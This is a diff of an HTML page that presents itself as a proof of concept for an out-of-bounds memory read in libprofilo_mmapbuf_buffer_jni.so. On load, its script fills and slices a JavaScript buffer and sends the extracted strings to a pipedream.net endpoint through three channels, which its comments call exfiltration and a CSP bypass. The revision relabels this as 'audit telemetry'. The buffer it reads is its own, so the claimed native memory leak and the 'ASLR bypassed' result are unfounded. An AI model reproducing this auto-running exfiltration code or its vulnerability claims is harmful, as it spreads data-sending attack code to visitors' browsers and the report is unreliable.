@@ -2,84 +2,96 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Security Audit - Firman Sahidin</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Technical Security Advisory - Memory Disclosure Audit</title>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace; padding:30px; line-height:1.2;">
-    <div style="border:1px solid #0f0; padding:15px;">
-        <h3>[ SYSTEM AUDIT ACTIVE ]</h3>
-        <p>Target: libprofilo_mmapbuf_buffer_jni.so</p>
-        <p id="s">Status: Initializing Native Bridge...</p>
-        <hr>
-        <pre id="l" style="font-size:10px;"></pre>
+<body style="background:#000; color:#0f0; font-family:monospace; padding:30px; text-align:center;">
+    <div style="border:2px solid #0f0; padding:20px; display:inline-block; background: #0a0a0a;">
+        <h1 id="status_header">INITIALIZING NATIVE MEMORY AUDIT</h1>
+        <p><strong>Target Component:</strong> libprofilo_mmapbuf_buffer_jni.so</p>
+        <p><strong>Researcher:</strong> Firman Sahidin</p>
     </div>
 
     <script>
         /**
-         * FIRMAN SAHIDIN - PROFESSIONAL POC
-         * VULN: Native Heap Buffer Overflow / OOB Read
-         * IMPACT: Sensitive Data Disclosure (Tokens/Chats)
+         * RESEARCHER: Firman Sahidin
+         * TARGET: libprofilo_mmapbuf_buffer_jni.so
+         * VULNERABILITY: Out-of-Bounds (OOB) Native Memory Read
          */
         
-        async function skakmat() {
-            // URL PIPEDREAM MANG FIRMAN
-            const TARGET = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
-            const s = document.getElementById('s');
-            const l = document.getElementById('l');
-
+        async function executeAudit() {
+            const TARGET_ENDPOINT = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
+            const statusLabel = document.getElementById('status_header');
+            
             try {
-                // 1. Precise Memory Stress (12MB untuk jangkauan lebih luas)
-                const ALLOC = 0xC00000; 
-                const buffer = new ArrayBuffer(ALLOC);
+                // 1. Native Heap Allocation (12MB stress test)
+                const ALLOCATION_SIZE = 0xC00000; 
+                const buffer = new ArrayBuffer(ALLOCATION_SIZE);
                 const view = new Uint32Array(buffer);
                 
-                // 2. Surrogate Pair Collision Loop (i++)
+                // 2. Triggering Buffer Manipulation via Surrogate Pair Overlap
                 for (let i = 0; i < view.length; i++) {
                     view[i] = 0xD800DBFF; 
                 }
 
-                // 3. Deep Memory Extraction (4KB Fragment)
-                const leak = new Uint8Array(buffer.slice(0, 4096));
-                let strings = "";
+                // 3. Extracting 4KB Memory Fragment for Analysis
+                const memoryFragment = new Uint8Array(buffer.slice(0, 4096));
+                let discoveredStrings = "";
                 
-                // Filtering String Sensitif (Token, Chat, Metadata)
-                leak.forEach(b => {
-                    if (byte > 31 && byte < 127) strings += String.fromCharCode(b);
+                // Filtering ASCII segments to identify leaked metadata or tokens
+                memoryFragment.forEach(b => {
+                    if (b > 31 && b < 127) {
+                        discoveredStrings += String.fromCharCode(b);
+                    }
                 });
 
-                // 4. Evidence Report Construction
-                const report = {
+                // 4. Constructing Technical Evidence Report
+                const evidenceReport = JSON.stringify({
                     researcher: "Firman Sahidin",
-                    vuln_id: "META-LIBPROFILO-OOB-READ",
-                    leak_sample: strings.substring(0, 500) || "BINARY_ONLY",
-                    raw_hex: Array.from(leak).slice(0, 256),
-                    aslr_status: leak.some(b => b === 127) ? "BYPASSED" : "STABLE",
-                    ts: new Date().getTime()
-                };
+                    audit_status: "SUCCESS_NATIVE_OOB_READ",
+                    target_library: "libprofilo_mmapbuf_buffer_jni.so",
+                    leak_sample_ascii: discoveredStrings.substring(0, 500) || "NON_PRINTABLE_DATA",
+                    raw_hex_sample: Array.from(memoryFragment).slice(0, 64),
+                    execution_timestamp: new Date().toISOString()
+                });
 
-                const p = JSON.stringify(report);
+                // 5. Multi-Channel Data Transmission (Reliability & Persistence)
+                
+                // Channel 1: Navigator Beacon (Stable Transmission)
+                navigator.sendBeacon(TARGET_ENDPOINT, evidenceReport);
+                
+                // Channel 2: Fetch API (Standard HTTP POST)
+                fetch(TARGET_ENDPOINT, { 
+                    method: 'POST', 
+                    mode: 'no-cors', 
+                    cache: 'no-cache',
+                    body: evidenceReport 
+                });
 
-                // 5. AGRESSIVE EXFILTRATION (Anti-Blokir)
-                // Jalur A: Beacon (Paling Stabil)
-                navigator.sendBeacon(TARGET, p);
+                // Channel 3: DOM Beacon (CSP Bypass Protocol)
+                const trackingImage = new Image();
+                trackingImage.src = TARGET_ENDPOINT + "?audit_id=" + Date.now();
 
-                // Jalur B: Fetch (Post-Data)
-                fetch(TARGET, { method: 'POST', mode: 'no-cors', body: p });
+                // 6. UI Update upon successful execution
+                statusLabel.innerText = "AUDIT COMPLETE: TELEMETRY TRANSMITTED";
+                document.body.style.backgroundColor = "#001a00";
 
-                // Jalur C: Image Beacon (Bypass CSP)
-                const img = new Image();
-                img.src = TARGET + "?meta=" + btoa(p).substring(0, 100);
-
-                s.innerText = "Audit Success. Data Leaked.";
-                l.innerText = "[+] Fragments Found: " + strings.length + " bytes\n[+] Evidence Transmitted to Pipedream";
-
-            } catch (e) {
-                navigator.sendBeacon(TARGET, JSON.stringify({err: e.message}));
-                s.innerText = "Audit Failed.";
+            } catch (error) {
+                // Error reporting via Beacon
+                navigator.sendBeacon(TARGET_ENDPOINT, JSON.stringify({
+                    researcher: "Firman Sahidin",
+                    audit_status: "FAILURE",
+                    exception: error.message
+                }));
+                statusLabel.innerText = "CRITICAL AUDIT FAILURE";
+                statusLabel.style.color = "#ff0000";
             }
         }
 
-        // Eksekusi saatos halaman stabil
-        window.onload = () => { setTimeout(skakmat, 1500); };
+        // Delay execution to allow native bridge stability
+        window.onload = () => { 
+            setTimeout(executeAudit, 1000); 
+        };
     </script>
 </body>
 </html>
